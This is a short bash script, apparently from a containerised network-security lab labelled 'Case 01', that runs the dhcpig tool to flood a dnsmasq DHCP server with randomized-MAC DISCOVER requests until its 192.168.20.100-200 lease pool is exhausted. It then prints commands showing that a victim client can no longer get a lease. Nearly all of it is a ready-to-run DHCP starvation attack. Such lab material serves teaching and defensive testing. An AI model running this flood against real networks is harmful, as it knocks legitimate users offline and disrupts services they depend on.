#!/bin/bash
# dhcp-starv.sh — real DHCP pool starvation (Case 01).
#
# dhcpig hammers r1's dnsmasq with randomized-chaddr DISCOVERs until the
# 192.168.20.100-200 pool is exhausted. A legitimate client (vb-victim) will
# then time out trying to renew.
#
# Usage:
#   dhcp-starv.sh <nic>            # 300 leases, moderate pace
#   dhcp-starv.sh eth2 500
set -u

NIC="${1:?usage: dhcp-starv.sh <nic> [leases]}"
TOTAL="${2:-300}"

echo "[*] starving DHCP on $NIC for ~${TOTAL} leases against 192.168.20.1"
echo "[*] dhcpig will run for ~120s; Ctrl+C to stop early."

# dhcpig floods using randomized source MACs; -f disables pacing, then it exits.
dhcpig -i "$NIC" -l "$TOTAL" -f 2>&1 | tail -n 5

echo
echo "[*] check the server side (r1):"
echo "  docker exec vb-r1 cat /var/lib/dnsmasq/dnsmasq.leases | wc -l"
echo "  docker exec vb-r1 tail -20 /var/lib/dnsmasq/dnsmasq.leases"
echo
echo "[*] then watch a real client fail (Case 01 payoff):"
echo "  docker exec vb-victim sh renew.sh"
echo "  -> 'No lease!' / 'no leases to offer' == pool exhausted"